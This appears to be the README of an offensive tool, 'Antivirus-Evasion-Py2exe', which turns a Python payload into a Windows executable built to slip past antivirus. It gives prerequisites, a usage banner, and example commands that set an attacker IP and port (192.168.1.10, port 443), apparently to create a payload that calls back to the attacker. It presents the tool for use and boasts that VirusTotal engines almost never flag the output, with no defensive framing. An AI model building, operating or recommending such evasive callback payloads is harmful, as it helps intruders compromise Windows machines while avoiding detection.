# Antivirus-Evasion-Py2exe
Simple python script to evade antiviruses on fully patched and updated Windows environments using a python then converted exe payload.

Keep in mind that attempting antivirus bypass is a game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about itand update their signatures database to block it. Then, new evasion techniques will a rise, which will make vendors to add it to their signature database, and so on.

By the time of this writing, the payload was flagged as malicious by only one vendor on Virus Total.

# Note: This script works only on Windows OS

# Prerequisite:
1. [Install Python 2.7.16 x86 for Windows](https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi)
2. [Install Py2exe 32 bits for Python 2.7](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)

# Usage:
```C:\>python aepy2exe.py -h
                                Antivirus Evasion Py2exe
 ,.      .                         ,--.                         ;-.      ,-.
/  \     |   o     o               |                o           |  )        )
|--| ;-. |-  . . , . ;-. . . ,-.   |-   . , ,-: ,-. . ,-. ;-.   |-'  . .   /  ,-. . , ,-.
|  | | | |   | |/  | |   | | `-.   |    |/  | | `-. | | | | |   |    | |  /   |-'  X  |-'
'  ' ' ' `-' ' '   ' '   `-` `-'   `--' '   `-` `-' ' `-' ' '   '    `-| '--' `-' ' ` `-'
                                                                     `-'
usage: aepy2exe.py [-h] [-e EXECUTE] [-ip ATTACKER_IP] [-p PORT]

Antivirus Evasion Py2exe

optional arguments:
  -h, --help            show this help message and exit
  -e EXECUTE, --execute EXECUTE
                        execute py2exe
  -ip ATTACKER_IP, --attacker_ip ATTACKER_IP
                        specified attacker IP
  -p PORT, --port PORT  specified attcaker port

Example:
        C:\>python aepy2exe.py -e py2exe -ip <ip_address> -p <port>
        C:\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443```
  
